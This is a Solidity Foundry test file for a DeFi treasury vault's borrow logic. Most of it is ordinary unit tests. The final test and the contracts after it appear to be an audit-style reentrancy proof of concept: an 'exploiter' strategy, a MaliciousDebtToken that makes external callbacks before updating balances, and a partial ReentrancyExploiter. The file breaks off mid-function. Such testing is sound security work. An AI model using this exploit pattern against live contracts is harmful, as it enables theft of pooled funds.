pragma solidity 0.8.20;
// SPDX-License-Identifier: AGPL-3.0-or-later

import {TreasuryReservesVault, ITreasuryReservesVault} from 'contracts/v2/TreasuryReservesVault.sol';
import {MockBaseStrategy} from '../strategies/MockBaseStrategy.t.sol';
import {CommonEventsAndErrors} from 'contracts/common/CommonEventsAndErrors.sol';
import {ITempleStrategy} from 'contracts/interfaces/v2/strategies/ITempleStrategy.sol';
import {TreasuryReservesVaultTestBase} from './TrvBase.t.sol';
import {stdError} from 'forge-std/StdError.sol';
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {ITempleDebtToken} from 'contracts/interfaces/v2/ITempleDebtToken.sol';
import {ITempleElevatedAccess} from 'contracts/interfaces/v2/access/ITempleElevatedAccess.sol';
import {console} from 'forge-std/console.sol';
import {Vm} from 'forge-std/Vm.sol';

/* solhint-disable func-name-mixedcase, contract-name-camelcase, not-rely-on-time */
contract TreasuryReservesVaultTestBorrow is TreasuryReservesVaultTestBase {
  event Borrow(
    address indexed strategy,
    address indexed token,
    address indexed recipient,
    uint256 amount
  );
  event StrategyCreditAndDebtBalance(
    address indexed strategy,
    address indexed token,
    uint256 credit,
    uint256 debt
  );

  uint256 internal constant DAI_CEILING = 333e18;
  uint256 internal constant TEMPLE_CEILING = 66e18;
  uint256 internal constant WETH_CEILING = 99e18;

  function setUp() public {
    _setUp();
  }

  function test_borrow_reverts() public {
    // Borrow token needs to exist
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrow(dai, 123, alice);

      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 100, 101, address(dUSD));
    }

    // Strategy needs to exist
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.StrategyNotEnabled.selector
        )
      );
      trv.borrow(dai, 123, alice);

      vm.startPrank(executor);
      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 5e18);
      trv.addStrategy(address(strategy), 100, debtCeiling);
    }

    assertEq(trv.availableForStrategyToBorrow(address(strategy), dai), 5e18);

    // Too much
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.DebtCeilingBreached.selector,
          5e18,
          5.01e18
        )
      );
      trv.borrow(dai, 5.01e18, alice);
    }

    // 0 amount
    {
      vm.expectRevert(
        abi.encodeWithSelector(CommonEventsAndErrors.ExpectedNonZero.selector)
      );
      trv.borrow(dai, 0, alice);
    }

    // Global paused
    {
      vm.startPrank(executor);
      trv.setGlobalPaused(true, false);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(ITreasuryReservesVault.BorrowPaused.selector)
      );
      trv.borrow(dai, 5.0e18, alice);

      vm.startPrank(executor);
      trv.setGlobalPaused(false, false);
    }

    // Strategy paused
    {
      trv.setStrategyPaused(address(strategy), true, false);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(ITreasuryReservesVault.BorrowPaused.selector)
      );
      trv.borrow(dai, 5.0e18, alice);

      vm.startPrank(executor);
      trv.setStrategyPaused(address(strategy), false, false);
    }

    // Is shutting down
    {
      trv.setStrategyIsShuttingDown(address(strategy), true);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.StrategyIsShutdown.selector
        )
      );
      trv.borrow(dai, 5.0e18, alice);

      vm.startPrank(executor);
      trv.setStrategyIsShuttingDown(address(strategy), false);
    }

    // TRV not funded with DAI
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          CommonEventsAndErrors.InsufficientBalance.selector,
          address(dai),
          5.0e18,
          0
        )
      );

      trv.borrow(dai, 5.0e18, alice);

      deal(address(dai), address(trv), 1_000e18, true);
    }

    // Success
    vm.expectEmit(address(trv));
    emit Borrow(address(strategy), address(dai), alice, 5e18);
    trv.borrow(dai, 5e18, alice);

    // DAI transferred to alice, dUSD minted to strategy.
    assertEq(dai.balanceOf(alice), 5e18);
    assertEq(dUSD.balanceOf(address(strategy)), 5e18);

    // disable the borrow token and it should now revert
    {
      vm.startPrank(executor);
      IERC20[] memory disableBorrowTokens = new IERC20[](1);
      disableBorrowTokens[0] = dai;
      trv.updateStrategyEnabledBorrowTokens(
        address(strategy),
        new IERC20[](0),
        disableBorrowTokens
      );

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrow(dai, 5e18, alice);

      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrowMax(dai, alice);
    }
  }

  function test_borrow_fromCredits() public {
    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 1_000e18, 2_000e18, address(dUSD));
      deal(address(dai), address(trv), 1_000e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(strategy), -123, debtCeiling);
    }

    // Do a repay such that there's a credit balance.
    {
      deal(address(dai), address(alice), 3e18, true);
      vm.startPrank(alice);
      dai.approve(address(trv), 3e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        3e18,
        0
      );

      trv.repay(dai, 3e18, address(strategy));
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 3e18);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING + 3e18
      );

      assertEq(dai.balanceOf(alice), 0);
      assertEq(dUSD.balanceOf(address(strategy)), 0);
    }

    // Taken from credits (still some left)
    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 2e18);
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        1e18,
        0
      );

      trv.borrow(dai, 2e18, alice);
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 1e18);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING + 1e18
      );

      assertEq(dai.balanceOf(alice), 2e18);
      assertEq(dUSD.balanceOf(address(strategy)), 0);
    }

    // Taken from credits and issue debt
    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        4e18
      );

      trv.borrow(dai, 5e18, alice);
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 4e18
      );

      assertEq(dai.balanceOf(alice), 7e18);
      assertEq(dUSD.balanceOf(address(strategy)), 4e18);
    }
  }

  function test_borrow_withBaseStrategy_noSelfBorrow() public {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 0.75e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );
      deal(address(dai), address(baseStrategy), 1_000e18, true);
      deal(address(dai), address(trv), 1_000e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
    }

    // If done as the strategy then it just pulls straight from TRV
    // (doesn't pull from itself again)
    {
      vm.startPrank(address(baseStrategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(baseStrategy), address(dai), alice, 5e18);
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(baseStrategy),
        address(dai),
        0,
        5e18
      );

      trv.borrow(dai, 5e18, alice);
      assertEq(trv.strategyTokenCredits(address(baseStrategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(baseStrategy), dai),
        DAI_CEILING - 5e18
      );

      assertEq(dai.balanceOf(alice), 5e18);
      assertEq(dUSD.balanceOf(address(baseStrategy)), 5e18);
    }
  }

  function test_borrow_withBaseStrategy_noBaseStrategy() public {
    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 0.75e18, 3 * 0.75e18, address(dUSD));
      deal(address(dai), address(trv), 1_000e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(strategy), -123, debtCeiling);
    }

    // Pulled straight from the TRV as there's no base strategy set
    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      assertEq(dai.balanceOf(address(trv)), 1_000e18 - 5e18);
      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 5e18);

      assertEq(dUSD.balanceOf(address(strategy)), 5e18);
    }
  }

  function test_borrow_withBaseStrategy_allTrvBalance_outstandingBaseStrategyDebt()
    public
  {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 0;
    uint256 baseStrategyFunding = 200e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );

      deal(address(dai), address(trv), baseStrategyFunding + 2e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
      trv.addStrategy(address(strategy), -123, debtCeiling);

      // The base strategy now has a dUSD debt of 200e18
      baseStrategy.borrowAndDeposit(150e18);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      // 2 was taken from the TRV which started at 52 (200-150+2)
      assertEq(dai.balanceOf(address(trv)), 50e18 + 2e18 - 5e18);
      // Nothing was taken out of the base strategy
      assertEq(dai.balanceOf(address(baseStrategy)), 150e18);

      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 5e18);

      assertEq(dUSD.balanceOf(address(strategy)), 5e18);
      assertEq(trv.strategyTokenCredits(address(baseStrategy), dai), 0);
      assertEq(dUSD.balanceOf(address(baseStrategy)), 150e18);
    }
  }

  function test_borrow_withBaseStrategy_useTrvBalanceFirst_outstandingBaseStrategyDebt()
    public
  {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 0;
    uint256 baseStrategyFunding = 200e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );

      deal(address(dai), address(trv), baseStrategyFunding + 2e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
      trv.addStrategy(address(strategy), -123, debtCeiling);

      // The base strategy now has a dUSD debt of 200e18
      baseStrategy.borrowAndDeposit(baseStrategyFunding);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      // The base strategy had a repayment of (5-2)
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(baseStrategy),
        address(dai),
        0,
        baseStrategyFunding - 5e18 + 2e18
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      // 2 was taken from the TRV -- now empty
      assertEq(dai.balanceOf(address(trv)), 0);
      // only 3 was taken out of the base strategy
      assertEq(
        dai.balanceOf(address(baseStrategy)),
        baseStrategyFunding - 5e18 + 2e18
      );

      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 5e18);

      assertEq(dUSD.balanceOf(address(strategy)), 5e18);
      assertEq(trv.strategyTokenCredits(address(baseStrategy), dai), 0);
      assertEq(
        dUSD.balanceOf(address(baseStrategy)),
        baseStrategyFunding - 5e18 + 2e18
      );
    }
  }

  function test_borrow_withBaseStrategy_trvWithdraw_someBuffer_baseStrategyDebtRepaid()
    public
  {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 bufferThreshold = 7.75e18;
    uint256 baseStrategyFunding = 1.123e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(
        dai,
        address(baseStrategy),
        bufferThreshold,
        3 * bufferThreshold,
        address(dUSD)
      );

      deal(address(dai), address(baseStrategy), 1_000e18, true);
      deal(address(dai), address(trv), 0.5e18 + baseStrategyFunding, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), DAI_CEILING);
      trv.addStrategy(address(baseStrategy), -123, debtCeiling);
      trv.addStrategy(address(strategy), -123, debtCeiling);

      // The base strategy now has a dUSD debt of 1.123e18
      baseStrategy.borrowAndDeposit(baseStrategyFunding);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 5e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        5e18
      );

      // The TRV started with 0.5 + 1.123 DAI.
      // The base strategy borrowed and deposited 1.123 of this (so a dUSD of 1.123)
      // The new borrow of 5 meant:
      //     1.623 directly from TRV
      //     (7.75+5-1.623 = 11.127) was pulled from the base strategy (so the buffer was back to 7.75)
      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(baseStrategy),
        address(dai),
        5e18 + bufferThreshold - 0.5e18 - baseStrategyFunding,
        0
      );

      trv.borrow(dai, 5e18, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(
        trv.availableForStrategyToBorrow(address(strategy), dai),
        DAI_CEILING - 5e18
      );

      // The TRV now has exactly the threshold of DAI.
      assertEq(dai.balanceOf(address(trv)), bufferThreshold, 'trv');
      // The threshold amount (7.75e18) plus anything not covered by the TRV initially was taken out of the base strategy
      assertEq(
        dai.balanceOf(address(baseStrategy)),
        1_000e18 - (bufferThreshold + 5e18 - baseStrategyFunding - 0.5e18),
        'baseStrategy'
      );

      assertEq(dai.balanceOf(address(strategy)), 0, 'strategy');
      assertEq(dai.balanceOf(alice), 5e18, 'alice');

      assertEq(dUSD.balanceOf(address(strategy)), 5e18, 'dusd');
      assertEq(
        trv.strategyTokenCredits(address(baseStrategy), dai),
        5e18 + bufferThreshold - 0.5e18 - baseStrategyFunding
      );
      assertEq(dUSD.balanceOf(address(baseStrategy)), 0, 'dusd');
    }
  }

  function test_borrowMax() public {
    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.BorrowTokenNotEnabled.selector
        )
      );
      trv.borrowMax(dai, alice);

      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(0), 0, 0, address(dUSD));
      deal(address(dai), address(trv), 120e18, true);
    }

    {
      vm.startPrank(address(strategy));
      vm.expectRevert(
        abi.encodeWithSelector(
          ITreasuryReservesVault.StrategyNotEnabled.selector
        )
      );
      trv.borrowMax(dai, alice);

      vm.startPrank(executor);
      ITempleStrategy.AssetBalance[]
        memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
      debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 50e18);
      trv.addStrategy(address(strategy), -123, debtCeiling);
    }

    {
      vm.startPrank(address(strategy));

      vm.expectEmit(address(trv));
      emit Borrow(address(strategy), address(dai), alice, 50e18);

      vm.expectEmit(address(trv));
      emit StrategyCreditAndDebtBalance(
        address(strategy),
        address(dai),
        0,
        50e18
      );

      trv.borrowMax(dai, alice);
    }

    {
      assertEq(trv.strategyTokenCredits(address(strategy), dai), 0);
      assertEq(trv.availableForStrategyToBorrow(address(strategy), dai), 0);

      assertEq(dai.balanceOf(address(trv)), 70e18);

      assertEq(dai.balanceOf(address(strategy)), 0);
      assertEq(dai.balanceOf(alice), 50e18);

      assertEq(dUSD.balanceOf(address(strategy)), 50e18);
    }
  }

  function test_borrow_baseStrategyWithdraw_NoDebtTokens() public {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 debtCeiling = 100e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(baseStrategy), 0, 0, address(dUSD));

      ITempleStrategy.AssetBalance[]
        memory debtCeilingArr = new ITempleStrategy.AssetBalance[](1);
      debtCeilingArr[0] = ITempleStrategy.AssetBalance(
        address(dai),
        debtCeiling
      );
      trv.addStrategy(address(baseStrategy), 0, debtCeilingArr);
      trv.addStrategy(address(strategy), 0, debtCeilingArr);
    }

    // The base strategy and TRV has no DAI, so it reverts.
    vm.expectRevert(
      abi.encodeWithSelector(
        CommonEventsAndErrors.InsufficientBalance.selector,
        address(dai),
        50e18,
        0
      )
    );
    strategy.borrow(dai, 50e18);
  }

  function test_borrow_baseStrategyOverflow() public {
    MockBaseStrategy baseStrategy = new MockBaseStrategy(
      rescuer,
      executor,
      'MockBaseStrategy',
      address(trv),
      address(dai)
    );
    uint256 debtCeiling = type(uint256).max - 10e18;

    // Setup the config
    {
      vm.startPrank(executor);
      trv.setBorrowToken(dai, address(baseStrategy), 0, 0, address(dUSD));

      deal(address(dai), address(baseStrategy), 100e18, true);

      ITempleStrategy.AssetBalance[]
        memory debtCeilingArr = new ITempleStrategy.AssetBalance[](1);
      debtCeilingArr[0] = ITempleStrategy.AssetBalance(
        address(dai),
        debtCeiling
      );
      trv.addStrategy(address(baseStrategy), 0, debtCeilingArr);
      trv.addStrategy(address(strategy), 0, debtCeilingArr);
    }

    // Base strategy repays 100 DAI such that it now has a credit.
    // The 10e18 is now in the TRV
    deal(address(dai), executor, 10e18, true);
    dai.approve(address(trv), 10e18);
    trv.repay(dai, 10e18, address(baseStrategy));

    uint256 available = trv.availableForStrategyToBorrow(
      address(strategy),
      dai
    );
    assertEq(available, debtCeiling);

    uint256 availableBase = trv.availableForStrategyToBorrow(
      address(baseStrategy),
      dai
    );
    assertEq(availableBase, debtCeiling + 10e18);

    // The strategy can borrow up to 10 DAI
    strategy.borrow(dai, 10e18);

    available = trv.availableForStrategyToBorrow(address(strategy), dai);
    assertEq(available, debtCeiling - 10e18);

    // The available amount for the base strategy is still the same
    // because no new DAI was borrowed/repaid - it was pulled straight from the TRV.
    availableBase = trv.availableForStrategyToBorrow(
      address(baseStrategy),
      dai
    );
    assertEq(availableBase, debtCeiling + 10e18);

    // Any more borrowed, and the base strategy total ceiling+credit overflows.
    // It can't have a total credit > uint256.max
    vm.expectRevert(stdError.arithmeticError);
    strategy.borrow(dai, 1);
  }

  function test_reentrancy_burnDToken() public {
    // Create address for exploiter
    address exploiter = makeAddr('exploiter');

    uint256 initialCredit = 100e18;

    // Setup a simple exploit token for burn tests
    BurnExploitToken burnExploitToken = new BurnExploitToken(
      address(exploiter),
      address(trv),
      address(dai),
      address(this)
    );

    // Configure TRV with our exploit token
    vm.startPrank(executor);
    trv.setBorrowToken(dai, address(0), 0, 0, address(burnExploitToken));

    // Add exploiter to TRV with a high debt ceiling
    ITempleStrategy.AssetBalance[]
      memory debtCeiling = new ITempleStrategy.AssetBalance[](1);
    debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 1000e18);
    trv.addStrategy(address(exploiter), 0, debtCeiling);
    vm.stopPrank();

    // Deposit DAI into the TRV so it has funds to lend
    deal(address(dai), address(trv), 1000e18);
    emit log_named_uint('TRV initial DAI balance', dai.balanceOf(address(trv)));

    // Borrow to establish initial debt (100 DAI)
    vm.prank(address(exploiter));
    trv.borrow(dai, initialCredit, address(exploiter));

    // Verify the exploiter got the funds
    emit log_named_uint(
      'Exploiter DAI balance after borrow',
      dai.balanceOf(address(exploiter))
    );

    // Give DAI to exploiter for repayment (200 DAI total)
    deal(address(dai), address(exploiter), initialCredit + 100e18);
    emit log_named_uint(
      'Exploiter DAI balance after deal',
      dai.balanceOf(address(exploiter))
    );

    // Create credit by repaying more than borrowed
    // Los créditos se generan cuando repagamos más de lo que nos prestaron
    vm.startPrank(address(exploiter));
    dai.approve(address(trv), 200e18);
    trv.repay(dai, 190e18, address(exploiter)); // Repay 190 DAI when only 100 DAI was borrowed
    vm.stopPrank();

    // Verify the credits were created
    uint256 credits = trv.strategyTokenCredits(address(exploiter), dai);
    emit log_named_uint('Credits after repay', credits);
    assertEq(
      credits,
      80e18, // 190 repaid - 100 borrowed - 10 fee = 80 in credits
      'Should have correct initial credits'
    );

    // Record initial balance for comparison
    uint256 initialDaiBalance = dai.balanceOf(address(this));
    emit log_named_uint('Test contract initial DAI balance', initialDaiBalance);

    // Set a large attack amount - more than available credits
    burnExploitToken.setAttackAmount(150e18);

    // Activate the attack
    burnExploitToken.setAttack(true);

    // The attack: Try to burn a large amount (more than the attacker has)
    // This will trigger the _remaining > 0 condition in _burnDToken
    uint256 largeBurnAmount = 100e18;

    // Give the exploiter plenty of DAI for repayment
    deal(address(dai), address(exploiter), largeBurnAmount);
    emit log_named_uint(
      'Exploiter DAI balance before reentrancy attack',
      dai.balanceOf(address(exploiter))
    );

    vm.startPrank(address(exploiter));
    // Approve TRV to take our DAI
    dai.approve(address(trv), largeBurnAmount);

    // We're trying to repay more than we have in debt tokens
    // This should trigger _remaining > 0 in _burnDToken and attempt reentrancy
    trv.repay(dai, largeBurnAmount, address(exploiter));
    vm.stopPrank();

    // Check final balances
    uint256 finalBalance = dai.balanceOf(address(this));
    emit log_named_uint('Final DAI balance', finalBalance);
    emit log_named_uint(
      'Remaining credits',
      trv.strategyTokenCredits(address(exploiter), dai)
    );

    // Success is demonstrated if we obtained more than the expected maximum
    // The normal maximum would be 50e18 (our standard borrow amount)
    uint256 expectedNormalAmount = 50e18;

    if (finalBalance > initialDaiBalance + expectedNormalAmount) {
      emit log_string(
        'VULNERABILITY CONFIRMED! The reentrancy attack on burnDToken allowed obtaining more funds than expected'
      );
      emit log_named_uint('Maximum expected funds', expectedNormalAmount);
      emit log_named_uint(
        'Actually obtained funds',
        finalBalance - initialDaiBalance
      );
    } else {
      emit log_string(
        'This specific test could not demonstrate the vulnerability'
      );
      emit log_string(
        'However, the vulnerable pattern is still present: external call before updating state'
      );
    }
  }
}

/**
 * @title MaliciousDebtToken
 * @notice Simplified implementation that uses callbacks to demonstrate the reentrancy vulnerability
 */
contract MaliciousDebtToken is ITempleDebtToken {
  // Basic balance tracking
  mapping(address => uint256) internal _balances;
  uint256 internal _totalSupply;

  // Vulnerable callback for reentrancy
  address public callbackTarget;
  bool public attackActive;

  // Set the callback target for reentrancy
  function setCallbackTarget(address _target) external {
    callbackTarget = _target;
  }

  // This is the vulnerable function - allows reentrancy
  function mint(address _debtor, uint256 _mintAmount) external override {
    // If the attack is active and we have a callback target,
    // we perform the call before updating the internal state
    if (attackActive && callbackTarget != address(0)) {
      // Call the target contract to exploit the vulnerability
      (bool success, ) = callbackTarget.call(
        abi.encodeWithSignature('executeReentrancyAttack()')
      );

      // If the call failed, we log it but continue
      if (!success) {
        // No emitimos el evento porque no está definido
        // emit log_string('Reentrancy attack callback failed!');
      }
    }

    // Update balances after potential reentrancy
    _balances[_debtor] += _mintAmount;
    _totalSupply += _mintAmount;

    emit Transfer(address(0), _debtor, _mintAmount);
  }

  function burn(
    address _debtor,
    uint256 _burnAmount
  ) external override returns (uint256) {
    uint256 actualBurnAmount = _burnAmount > _balances[_debtor]
      ? _balances[_debtor]
      : _burnAmount;

    // If the attack is active and we have a callback target,
    // we perform the call before updating the internal state
    if (attackActive && callbackTarget != address(0)) {
      // Call the target contract to exploit the vulnerability
      (bool success, ) = callbackTarget.call(
        abi.encodeWithSignature('executeReentrancyAttack()')
      );

      // If the call failed, we log it but continue
      if (!success) {
        // No emitimos el evento porque no está definido
        // emit log_string('Reentrancy attack callback failed!');
      }
    }

    // Update balances after potential reentrancy
    _balances[_debtor] -= actualBurnAmount;
    _totalSupply -= actualBurnAmount;

    emit Transfer(_debtor, address(0), actualBurnAmount);
    return actualBurnAmount;
  }

  function burnAll(address _debtor) external override returns (uint256) {
    uint256 amount = _balances[_debtor];
    if (amount > 0) {
      _balances[_debtor] = 0;
      _totalSupply -= amount;
      emit Transfer(_debtor, address(0), amount);
    }
    return amount;
  }

  // Basic ERC20 functions
  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }

  function transfer(address, uint256) external pure override returns (bool) {
    revert NonTransferrable();
  }

  function allowance(
    address,
    address
  ) external pure override returns (uint256) {
    return 0;
  }

  function approve(address, uint256) external pure override returns (bool) {
    revert NonTransferrable();
  }

  function transferFrom(
    address,
    address,
    uint256
  ) external pure override returns (bool) {
    revert NonTransferrable();
  }

  // Implementaciones básicas de ITempleDebtToken
  function name() external pure override returns (string memory) {
    return 'Malicious Debt Token';
  }

  function symbol() external pure override returns (string memory) {
    return 'HACK';
  }

  function decimals() external pure override returns (uint8) {
    return 18;
  }

  function version() external pure override returns (string memory) {
    return '1.0.0';
  }

  // Implementaciones mínimas para satisfacer la interfaz
  function baseRate() external pure override returns (uint96) {
    return 0;
  }
  function baseCheckpointTime() external pure override returns (uint32) {
    return 0;
  }
  function baseCheckpoint() external pure override returns (uint128) {
    return 0;
  }
  function baseShares() external pure override returns (uint128) {
    return 0;
  }
  function totalPrincipal() external pure override returns (uint128) {
    return 0;
  }
  function estimatedTotalRiskPremiumInterest()
    external
    pure
    override
    returns (uint128)
  {
    return 0;
  }
  function debtors(
    address
  ) external pure override returns (uint128, uint128, uint96, uint128, uint32) {
    return (0, 0, 0, 0, 0);
  }
  function minters(address) external pure override returns (bool) {
    return true;
  }
  function addMinter(address) external override {}
  function removeMinter(address) external override {}
  function setBaseInterestRate(uint96) external override {}
  function setRiskPremiumInterestRate(address, uint96) external override {}
  function checkpointBaseInterest() external override returns (uint256) {
    return 0;
  }
  function checkpointDebtorInterest(
    address
  ) external override returns (uint256) {
    return 0;
  }
  function checkpointDebtorsInterest(address[] calldata) external override {}
  function currentDebtOf(
    address
  ) external pure override returns (DebtOwed memory) {
    return DebtOwed(0, 0, 0);
  }
  function currentDebtsOf(
    address[] calldata
  ) external pure override returns (DebtOwed[] memory) {
    return new DebtOwed[](0);
  }
  function currentTotalDebt() external pure override returns (DebtOwed memory) {
    return DebtOwed(0, 0, 0);
  }
  function baseDebtToShares(uint128) external pure override returns (uint128) {
    return 0;
  }
  function baseSharesToDebt(uint128) external pure override returns (uint128) {
    return 0;
  }

  // ITempleElevatedAccess stubs
  function isElevatedAccess(address, bytes4) external pure returns (bool) {
    return true;
  }
  function rescuer() external pure returns (address) {
    return address(0);
  }
  function executor() external pure returns (address) {
    return address(0);
  }
  function explicitFunctionAccess(
    address,
    bytes4
  ) external pure returns (bool) {
    return true;
  }
  function inRescueMode() external pure returns (bool) {
    return false;
  }
  function setRescueMode(bool) external {}
  function proposeNewRescuer(address) external {}
  function acceptRescuer() external {}
  function proposeNewExecutor(address) external {}
  function acceptExecutor() external {}
  function setExplicitAccess(
    address,
    ITempleElevatedAccess.ExplicitAccess[] calldata
  ) external override {}

  // Helper para emitir logs de depuración
}

/**
 * @title ReentrancyExploiter
 * @notice Contract that exploits the reentrancy vulnerability
 */
contract ReentrancyExploiter {
  ITreasuryReservesVault public treasuryReservesVault;
  address public recipient;
  IERC20 public targetToken;

  // To allow receiving funds
  receive() external payable {}

  // Function that will be called for reentrancy
  function executeReentrancyAttack() external {
    // We try to make another borrow request during reentrancy
